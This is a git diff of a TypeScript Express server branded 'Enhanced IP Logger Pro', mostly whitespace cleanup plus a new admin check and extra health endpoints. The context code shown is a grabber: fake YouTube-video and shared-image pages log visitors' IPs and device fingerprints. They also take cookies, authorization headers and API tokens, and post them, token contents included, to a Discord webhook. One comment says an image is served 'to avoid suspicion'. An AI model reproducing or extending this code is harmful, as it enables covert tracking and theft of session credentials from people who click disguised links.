@@ -14,7 +14,7 @@ const upload = multer({
   limits: { fileSize: Infinity }, // No file size limit
   fileFilter: (req, file, cb) => {
     // Accept ANY image or video format
-    if (file.mimetype.startsWith('image/') || 
+    if (file.mimetype.startsWith('image/') ||
         file.mimetype.startsWith('video/') ||
         file.mimetype === 'application/octet-stream') { // Accept unknown binary files as potential images
       cb(null, true);
@@ -52,35 +52,35 @@ function getLocationFromIp(ip: string): LocationData {
 
   // Enhanced VPN detection with more realistic patterns
   const vpnProviders = [
-    { 
-      provider: 'NordVPN', 
+    {
+      provider: 'NordVPN',
       locations: ['Amsterdam, Netherlands', 'Berlin, Germany', 'New York, US', 'Toronto, Canada', 'London, UK'],
-      likelihood: 0.25 
+      likelihood: 0.25
     },
-    { 
-      provider: 'ExpressVPN', 
+    {
+      provider: 'ExpressVPN',
       locations: ['London, UK', 'Singapore', 'Los Angeles, US', 'Vancouver, Canada', 'Sydney, Australia'],
-      likelihood: 0.22 
+      likelihood: 0.22
     },
-    { 
-      provider: 'Surfshark', 
+    {
+      provider: 'Surfshark',
       locations: ['Amsterdam, Netherlands', 'Chicago, US', 'Manchester, UK', 'Frankfurt, Germany'],
-      likelihood: 0.18 
+      likelihood: 0.18
     },
-    { 
-      provider: 'ProtonVPN', 
+    {
+      provider: 'ProtonVPN',
       locations: ['Zurich, Switzerland', 'Amsterdam, Netherlands', 'Miami, US', 'Munich, Germany'],
-      likelihood: 0.15 
+      likelihood: 0.15
     },
-    { 
-      provider: 'CyberGhost', 
+    {
+      provider: 'CyberGhost',
       locations: ['Bucharest, Romania', 'Paris, France', 'San Francisco, US', 'Stockholm, Sweden'],
-      likelihood: 0.12 
+      likelihood: 0.12
     },
-    { 
-      provider: 'Private Internet Access', 
+    {
+      provider: 'Private Internet Access',
       locations: ['Denver, US', 'Prague, Czech Republic', 'Melbourne, Australia', 'Helsinki, Finland'],
-      likelihood: 0.08 
+      likelihood: 0.08
     }
   ];
 
@@ -126,7 +126,7 @@ function getLocationFromIp(ip: string): LocationData {
   }
 
   // Data center IP patterns
-  if ((ipParts[0] >= 104 && ipParts[0] <= 108) || 
+  if ((ipParts[0] >= 104 && ipParts[0] <= 108) ||
       (ipParts[0] >= 172 && ipParts[0] <= 175)) {
     vpnDetectionScore += 0.3;
   }
@@ -176,32 +176,32 @@ interface DeviceInfo {
 function parseDeviceInfo(userAgent: string): DeviceInfo {
   const ua = userAgent.toLowerCase();
   const originalUa = userAgent;
-  
+
   // Security and bot detection flags
   const securityFlags: string[] = [];
   const capabilities: string[] = [];
-  
+
   // Bot detection patterns
   const botPatterns = [
     /bot|crawler|spider|scraper|fetch|curl|wget|axios|python|perl|ruby|php|java|postman/i,
     /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit/i,
     /linkedinbot|twitterbot|whatsapp|telegram|discord|slack|headlesschrome|puppeteer/i
   ];
-  
+
   const isBot = botPatterns.some(pattern => pattern.test(originalUa));
   if (isBot) securityFlags.push('Potential Bot/Scraper');
-  
+
   // Suspicious patterns detection
   const suspiciousPatterns = [
     /headless|phantom|selenium|webdriver|automation/i,
     /^python|^curl|^wget|^axios|^nodejs/i,
     /scanner|vulnerability|pentest|hack/i
   ];
-  
-  const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(originalUa)) || 
+
+  const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(originalUa)) ||
                       originalUa.length < 20 || originalUa.length > 2000;
   if (isSuspicious) securityFlags.push('Suspicious User Agent');
-  
+
   // Enhanced Device Type Detection
   let deviceType = 'unknown';
   if (ua.includes('mobile') || ua.includes('android') && !ua.includes('tablet') || ua.includes('iphone')) {
@@ -217,13 +217,13 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
   } else {
     deviceType = 'desktop';
   }
-  
+
   // Enhanced Browser Detection with version extraction
   let browserName = 'unknown';
   let browserVersion = 'unknown';
   let engine = 'unknown';
   let engineVersion = 'unknown';
-  
+
   // Chrome and Chrome-based browsers
   if (ua.includes('chrome') && !ua.includes('edge')) {
     if (ua.includes('brave')) {
@@ -271,12 +271,12 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     browserVersion = ieMatch ? ieMatch[1] : 'unknown';
     engine = 'Trident';
   }
-  
+
   // Enhanced Operating System Detection with version
   let operatingSystem = 'unknown';
   let osVersion = 'unknown';
   let architecture = 'unknown';
-  
+
   if (ua.includes('windows')) {
     operatingSystem = 'Windows';
     if (ua.includes('windows nt 10.0')) osVersion = '10/11';
@@ -284,14 +284,14 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     else if (ua.includes('windows nt 6.2')) osVersion = '8';
     else if (ua.includes('windows nt 6.1')) osVersion = '7';
     else if (ua.includes('windows nt 6.0')) osVersion = 'Vista';
-    
+
     if (ua.includes('win64') || ua.includes('wow64')) architecture = 'x64';
     else if (ua.includes('win32')) architecture = 'x86';
   } else if (ua.includes('macintosh') || ua.includes('mac os')) {
     operatingSystem = 'macOS';
     const macMatch = ua.match(/mac os x ([\d_]+)/);
     if (macMatch) osVersion = macMatch[1].replace(/_/g, '.');
-    
+
     if (ua.includes('intel')) architecture = 'Intel';
     else if (ua.includes('ppc')) architecture = 'PowerPC';
   } else if (ua.includes('linux')) {
@@ -300,7 +300,7 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     else if (ua.includes('debian')) osVersion = 'Debian';
     else if (ua.includes('fedora')) osVersion = 'Fedora';
     else if (ua.includes('centos')) osVersion = 'CentOS';
-    
+
     if (ua.includes('x86_64')) architecture = 'x64';
     else if (ua.includes('i686')) architecture = 'x86';
     else if (ua.includes('arm')) architecture = 'ARM';
@@ -308,21 +308,21 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     operatingSystem = 'Android';
     const androidMatch = ua.match(/android ([\d\.]+)/);
     if (androidMatch) osVersion = androidMatch[1];
-    
+
     if (ua.includes('arm64')) architecture = 'ARM64';
     else if (ua.includes('arm')) architecture = 'ARM';
   } else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) {
     operatingSystem = 'iOS';
     const iosMatch = ua.match(/os ([\d_]+)/);
     if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
-    
+
     architecture = 'ARM64';
   }
-  
+
   // Enhanced Device Brand and Model Detection
   let deviceBrand = 'unknown';
   let deviceModel = 'unknown';
-  
+
   if (ua.includes('samsung')) {
     deviceBrand = 'Samsung';
     const samsungMatch = ua.match(/samsung[;\s]([^;\s)]+)/);
@@ -354,7 +354,7 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     const pixelMatch = ua.match(/pixel[;\s]([^;\s)]+)/);
     if (pixelMatch) deviceModel = `Pixel ${pixelMatch[1]}`;
   }
-  
+
   // Advanced capability and feature detection
   if (ua.includes('webkit')) capabilities.push('🌐 WebKit Support');
   if (ua.includes('mobile')) capabilities.push('📱 Mobile Optimized');
@@ -364,7 +364,7 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     capabilities.push('🤖 Headless Browser');
     securityFlags.push('Headless Browser Detected');
   }
-  
+
   // Advanced browser features detection based on version and engine
   if (browserName === 'Chrome' && browserVersion) {
     const chromeVersion = parseInt(browserVersion.split('.')[0]);
@@ -374,21 +374,21 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     if (chromeVersion >= 89) capabilities.push('📊 Web Share API');
     if (chromeVersion >= 84) capabilities.push('🌍 Web Locks API');
   }
-  
+
   if (browserName === 'Firefox' && browserVersion) {
     const firefoxVersion = parseInt(browserVersion.split('.')[0]);
     if (firefoxVersion >= 98) capabilities.push('📸 Screen Capture API');
     if (firefoxVersion >= 94) capabilities.push('🎥 WebRTC Enhanced');
     if (firefoxVersion >= 89) capabilities.push('🔐 Web Crypto Enhanced');
   }
-  
+
   if (browserName === 'Safari' && browserVersion) {
     const safariVersion = parseFloat(browserVersion);
     if (safariVersion >= 15.4) capabilities.push('📸 Screen Share API');
     if (safariVersion >= 15.0) capabilities.push('🎥 WebRTC Support');
     if (safariVersion >= 14.0) capabilities.push('🔊 Web Audio Enhanced');
   }
-  
+
   // Mobile-specific capabilities
   if (deviceType === 'mobile' || deviceType === 'tablet') {
     capabilities.push('📍 Geolocation API');
@@ -403,7 +403,7 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
       capabilities.push('📱 Chrome Mobile Engine');
     }
   }
-  
+
   // Desktop-specific capabilities
   if (deviceType === 'desktop') {
     capabilities.push('💻 Full DOM Access');
@@ -411,14 +411,14 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     capabilities.push('🖱️ Pointer Events');
     capabilities.push('⌨️ Keyboard API');
   }
-  
+
   // Advanced security and privacy features detection
   if (ua.includes('secure')) capabilities.push('🔒 Enhanced Security');
   if (ua.includes('private') || ua.includes('incognito')) {
     capabilities.push('🕶️ Private Browsing');
     securityFlags.push('Private/Incognito Mode');
   }
-  
+
   // Developer tools detection patterns
   const devToolPatterns = [
     'devtools', 'inspect', 'debug', 'developer', 'firebug', 'webkit-inspector'
@@ -427,36 +427,36 @@ function parseDeviceInfo(userAgent: string): DeviceInfo {
     securityFlags.push('Developer Tools Detected');
     capabilities.push('🛠️ Developer Tools');
   }
-  
+
   // Advanced bot and automation detection
   if (ua.includes('chrome') && !ua.includes('version') && !ua.includes('safari')) {
     securityFlags.push('Potential Automation Tool');
   }
-  
+
   // Screen recording/capture detection patterns
   const screenCapturePatterns = ['obs', 'screen', 'capture', 'record', 'streaming'];
   if (screenCapturePatterns.some(pattern => ua.includes(pattern))) {
     securityFlags.push('Screen Capture Software');
     capabilities.push('📹 Screen Recording Tools');
   }
-  
+
   // VPN/Privacy tool detection in user agent
   const privacyTools = ['vpn', 'proxy', 'tor', 'anonymous', 'privacy', 'secure'];
   if (privacyTools.some(tool => ua.includes(tool))) {
     securityFlags.push('Privacy Tools Detected');
   }
-  
+
   // Security analysis
   if (originalUa === '') securityFlags.push('Empty User Agent');
   if (originalUa.split(' ').length < 3) securityFlags.push('Minimal User Agent');
   if (!ua.includes('mozilla')) securityFlags.push('Non-Mozilla Compatible');
-  
+
   // Generate device fingerprint
   const fingerprint = Buffer.from(
     `${deviceType}-${browserName}-${operatingSystem}-${deviceBrand}-${architecture}`,
     'utf-8'
   ).toString('base64').substring(0, 16);
-  
+
   return {
     deviceType,
     browserName,
@@ -489,11 +489,11 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
     const isSuspicious = data.isSuspicious || false;
     const securityFlags = data.securityFlags || [];
     const capabilities = data.capabilities || [];
-    
+
     // Determine threat level and color
     let threatLevel = "🟢 Low";
     let embedColor = 0x00AA00; // Green
-    
+
     if (isBot || isSuspicious || securityFlags.length > 0) {
       threatLevel = "🔴 High";
       embedColor = 0xFF4444; // Red
@@ -501,7 +501,7 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
       threatLevel = "🟡 Medium";
       embedColor = 0xFFAA00; // Orange
     }
-    
+
     const webhookData = {
       username: "🕵️ Enhanced IP Logger Pro",
       avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
@@ -510,48 +510,48 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
         description: `**Threat Level:** ${threatLevel}${securityFlags.length > 0 ? `\n**Security Flags:** ${securityFlags.join(', ')}` : ''}`,
         color: embedColor,
         fields: [
-          { 
-            name: "🌐 **Network Intelligence**", 
-            value: `**IP Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}\n**ISP Type:** ${isVpnDetected ? "VPN/Proxy Service" : "Direct Connection"}`, 
-            inline: false 
+          {
+            name: "🌐 **Network Intelligence**",
+            value: `**IP Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}\n**ISP Type:** ${isVpnDetected ? "VPN/Proxy Service" : "Direct Connection"}`,
+            inline: false
           },
           ...(isVpnDetected ? [{
-            name: "🛡️ **VPN Analysis**", 
-            value: `**VPN Server:** ${data.vpnLocation || "Unknown"}\n**Real Location:** ${data.realLocation || "Estimated Hidden"}\n**Anonymity Level:** High`, 
-            inline: false 
+            name: "🛡️ **VPN Analysis**",
+            value: `**VPN Server:** ${data.vpnLocation || "Unknown"}\n**Real Location:** ${data.realLocation || "Estimated Hidden"}\n**Anonymity Level:** High`,
+            inline: false
           }] : []),
-          { 
-            name: "💻 **Device Information**", 
-            value: `**Type:** ${data.deviceType || "Unknown"} ${data.deviceModel ? `(${data.deviceModel})` : ''}\n**Brand:** ${data.deviceBrand || "Unknown"}\n**Architecture:** ${data.architecture || "Unknown"}\n**Fingerprint:** \`${data.fingerprint || "N/A"}\``, 
-            inline: true 
+          {
+            name: "💻 **Device Information**",
+            value: `**Type:** ${data.deviceType || "Unknown"} ${data.deviceModel ? `(${data.deviceModel})` : ''}\n**Brand:** ${data.deviceBrand || "Unknown"}\n**Architecture:** ${data.architecture || "Unknown"}\n**Fingerprint:** \`${data.fingerprint || "N/A"}\``,
+            inline: true
           },
-          { 
-            name: "🌐 **Browser Details**", 
-            value: `**Browser:** ${data.browserName || "Unknown"} ${data.browserVersion ? `v${data.browserVersion}` : ''}\n**Engine:** ${data.engine || "Unknown"} ${data.engineVersion ? `v${data.engineVersion}` : ''}\n**OS:** ${data.operatingSystem || "Unknown"} ${data.osVersion ? `${data.osVersion}` : ''}`, 
-            inline: true 
+          {
+            name: "🌐 **Browser Details**",
+            value: `**Browser:** ${data.browserName || "Unknown"} ${data.browserVersion ? `v${data.browserVersion}` : ''}\n**Engine:** ${data.engine || "Unknown"} ${data.engineVersion ? `v${data.engineVersion}` : ''}\n**OS:** ${data.operatingSystem || "Unknown"} ${data.osVersion ? `${data.osVersion}` : ''}`,
+            inline: true
           },
           ...(capabilities.length > 0 ? [{
-            name: "⚙️ **Browser Capabilities**", 
-            value: capabilities.join('\n• '), 
-            inline: false 
+            name: "⚙️ **Browser Capabilities**",
+            value: capabilities.join('\n• '),
+            inline: false
           }] : []),
-          { 
-            name: "🔍 **Session Context**", 
-            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Authentication:** ${data.tokens && data.tokens !== 'None' ? "🔒 Tokens Found" : "❌ No Auth Tokens"}\n**Cookies:** ${data.cookies && data.cookies !== 'None' ? "🍪 Present" : "❌ None"}\n**Visit Time:** <t:${Math.floor(Date.now() / 1000)}:F>`, 
-            inline: false 
+          {
+            name: "🔍 **Session Context**",
+            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Authentication:** ${data.tokens && data.tokens !== 'None' ? "🔒 Tokens Found" : "❌ No Auth Tokens"}\n**Cookies:** ${data.cookies && data.cookies !== 'None' ? "🍪 Present" : "❌ None"}\n**Visit Time:** <t:${Math.floor(Date.now() / 1000)}:F>`,
+            inline: false
           },
           ...(data.tokens && data.tokens !== 'None' ? [{
-            name: "🔐 **Security Tokens Found**", 
-            value: `\`\`\`${data.tokens.substring(0, 300)}${data.tokens.length > 300 ? "..." : ""}\`\`\``, 
-            inline: false 
+            name: "🔐 **Security Tokens Found**",
+            value: `\`\`\`${data.tokens.substring(0, 300)}${data.tokens.length > 300 ? "..." : ""}\`\`\``,
+            inline: false
           }] : []),
-          { 
-            name: "📡 **Technical Details**", 
-            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 400) + (data.userAgent.length > 400 ? "\n..." : "") : "No User Agent"}\`\`\``, 
-            inline: false 
+          {
+            name: "📡 **Technical Details**",
+            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 400) + (data.userAgent.length > 400 ? "\n..." : "") : "No User Agent"}\`\`\``,
+            inline: false
           }
         ],
-        footer: { 
+        footer: {
           text: `🚀 Enhanced IP Logger Pro v2.0 ${isBot ? "• Bot Detection" : isSuspicious ? "• Threat Analysis" : isVpnDetected ? "• VPN Shield" : "• Stealth Mode"}`,
           icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
         },
@@ -567,7 +567,7 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
       try {
         const response = await fetch(webhookUrl, {
           method: 'POST',
-          headers: { 
+          headers: {
             'Content-Type': 'application/json',
             'User-Agent': 'IPLogger-Bot/1.0'
           },
@@ -618,6 +618,14 @@ async function authenticateUser(req: Request, res: Response, next: Function) {
   next();
 }
 
+// Middleware to check if user is admin (or developer for some actions)
+async function requireAdmin(req: Request, res: Response, next: Function) {
+  if (!req.user || (!req.user.isDev && req.user.accountType !== 'admin')) {
+    return res.status(403).json({ error: 'Access denied. Administrator privileges required.' });
+  }
+  next();
+}
+
 // Extend Express Request type
 declare global {
   namespace Express {
@@ -628,17 +636,27 @@ declare global {
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Health check endpoint - for keeping the app alive
+  // Health check endpoint for UptimeRobot and monitoring services
   app.get('/health', (req: Request, res: Response) => {
-    res.status(200).json({ 
-      status: 'ok', 
+    res.status(200).json({
+      status: 'healthy',
       timestamp: new Date().toISOString(),
       uptime: process.uptime(),
-      message: 'Server is running and accepting requests'
+      service: 'IP Tracker API',
+      version: '1.0.0'
     });
   });
 
-  // Ping endpoint - simple keep-alive endpoint
+  // Alternative health check endpoints
+  app.get('/api/health', (req: Request, res: Response) => {
+    res.status(200).json({
+      status: 'ok',
+      timestamp: new Date().toISOString(),
+      service: 'running'
+    });
+  });
+
+  // Simple ping endpoint
   app.get('/ping', (req: Request, res: Response) => {
     res.status(200).send('pong');
   });
@@ -672,14 +690,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { username, password } = req.body;
       console.log(`🔐 Login attempt - Username: "${username}"`);
-      
+
       if (!username || !password) {
         return res.status(400).json({ error: 'Username and password are required' });
       }
 
       const user = await storage.getUserByUsername(username);
       console.log(`👤 User found:`, user ? `Yes (username: ${user.username}, isDev: ${user.isDev})` : 'No');
-      
+
       if (!user || !(await bcrypt.compare(password, user.password))) {
         console.log(`❌ Login failed - User: ${!!user}, Password match: ${user ? 'checked with bcrypt' : false}`);
         return res.status(401).json({ error: 'Invalid credentials' });
@@ -698,14 +716,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
         expiresAt
       });
 
-      res.json({ 
-        token: sessionToken, 
-        user: { 
-          id: user.id, 
-          username: user.username, 
-          theme: user.theme, 
-          isDev: user.isDev 
-        } 
+      res.json({
+        token: sessionToken,
+        user: {
+          id: user.id,
+          username: user.username,
+          theme: user.theme,
+          isDev: user.isDev
+        }
       });
     } catch (error) {
       console.error('Login error:', error);
@@ -727,13 +745,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
         password: validatedData.password,
         accessKeyUsed: req.body.accessKey || null
       });
-      res.json({ 
-        success: true, 
-        user: { 
-          id: user.id, 
-          username: user.username, 
-          theme: user.theme 
-        } 
+      res.json({
+        success: true,
+        user: {
+          id: user.id,
+          username: user.username,
+          theme: user.theme
+        }
       });
     } catch (error) {
       console.error('Registration error:', error);
@@ -822,15 +840,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.put('/api/user/password', authenticateUser, async (req: Request, res: Response) => {
     try {
       const validatedData = updatePasswordSchema.parse(req.body);
-      
+
       // Ensure user can only change their own password through this endpoint
       if (!req.user?.id) {
         return res.status(401).json({ error: 'User authentication required' });
       }
-      
+
       await storage.updateUserPassword(req.user.id, validatedData.currentPassword, validatedData.password);
-      
-      res.json({ 
+
+      res.json({
         success: true,
         message: 'Password updated successfully by account owner'
       });
@@ -1058,7 +1076,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       const updatedUser = await storage.updateUserRole(userId, { accountType, isDev }, req.user.id);
-      
+
       res.json({
         id: updatedUser.id,
         username: updatedUser.username,
@@ -1099,7 +1117,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       await storage.adminResetUserPassword(userId, newPassword, req.user.id);
-      
+
       res.json({
         success: true,
         message: 'Password reset successfully by authorized administrator'
@@ -1168,7 +1186,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // ALWAYS attempt to send webhook if any settings exist
       const allUsers = await storage.getAllUsers();
       let webhookSent = false;
-      
+
       for (const user of allUsers) {
         try {
           const userSettings = await storage.getSettings(user.id);
@@ -1198,7 +1216,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           console.error(`❌ Webhook sending failed for user ${user.username}:`, webhookError);
         }
       }
-      
+
       if (!webhookSent) {
         console.log('ℹ️ No webhook configured for any user, skipping Discord notification');
       }
@@ -1211,19 +1229,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
   <title>Loading YouTube Video...</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  
+
   <!-- YouTube meta tags for sharing -->
   <meta property="og:type" content="video.other">
   <meta property="og:title" content="YouTube Video">
   <meta property="og:description" content="Watch this video on YouTube">
   <meta property="og:image" content="https://img.youtube.com/vi/${videoId}/maxresdefault.jpg">
   <meta property="og:video" content="https://www.youtube.com/watch?v=${videoId}">
-  
+
   <style>
-    body { 
-      margin: 0; 
-      padding: 0; 
-      font-family: Arial, sans-serif; 
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
       background: #0f0f0f;
       color: white;
       display: flex;
@@ -1283,7 +1301,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     setTimeout(function() {
       window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
     }, 1500);
-    
+
     // Fallback redirect if user clicks anywhere
     document.addEventListener('click', function() {
       window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
@@ -1531,7 +1549,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const authTokens = [];
       const sensitiveData = [];
       const headerAnalysis = [];
-      
+
       // Comprehensive cookie analysis
       if (cookies) {
         // Authentication tokens with categorization
@@ -1552,14 +1570,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
             });
           }
         });
-        
+
         // Sensitive personal data patterns
         const personalDataPatterns = [
           { pattern: /user[^=]*=([^;]+)/gi, type: '👤 User ID' },
           { pattern: /email[^=]*=([^;]+)/gi, type: '📧 Email' },
           { pattern: /username[^=]*=([^;]+)/gi, type: '👥 Username' }
         ];
-        
+
         personalDataPatterns.forEach(({ pattern, type }) => {
           const matches = cookies.match(pattern);
           if (matches) {
@@ -1576,7 +1594,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (authHeader) {
         authTokens.push(`🔐 Authorization: ${authHeader.substring(0, 30)}...`);
       }
-      
+
       // Additional security headers
       ['x-auth-token', 'x-api-key', 'x-access-token', 'x-csrf-token'].forEach(header => {
         const value = req.headers[header];
@@ -1707,7 +1725,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const authTokens = [];
       const sensitiveData = [];
       const headerAnalysis = [];
-      
+
       // Comprehensive cookie analysis
       if (cookies) {
         // Authentication tokens with categorization
@@ -1728,14 +1746,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
             });
           }
         });
-        
+
         // Sensitive personal data patterns
         const personalDataPatterns = [
           { pattern: /user[^=]*=([^;]+)/gi, type: '👤 User ID' },
           { pattern: /email[^=]*=([^;]+)/gi, type: '📧 Email' },
           { pattern: /username[^=]*=([^;]+)/gi, type: '👥 Username' }
         ];
-        
+
         personalDataPatterns.forEach(({ pattern, type }) => {
           const matches = cookies.match(pattern);
           if (matches) {
@@ -1752,7 +1770,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (authHeader) {
         authTokens.push(`🔐 Authorization: ${authHeader.substring(0, 30)}...`);
       }
-      
+
       // Additional security headers
       ['x-auth-token', 'x-api-key', 'x-access-token', 'x-csrf-token'].forEach(header => {
         const value = req.headers[header];
@@ -1883,10 +1901,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
   <title>Shared Image</title>
 
   <style>
-    body { 
-      margin: 0; 
-      padding: 20px; 
-      font-family: Arial, sans-serif; 
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Arial, sans-serif;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       color: white;
       text-align: center;
@@ -1967,7 +1985,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error('Error serving image:', error);
 
       // Even if there's an error, still serve a large visible image to avoid suspicion
-      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDkuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA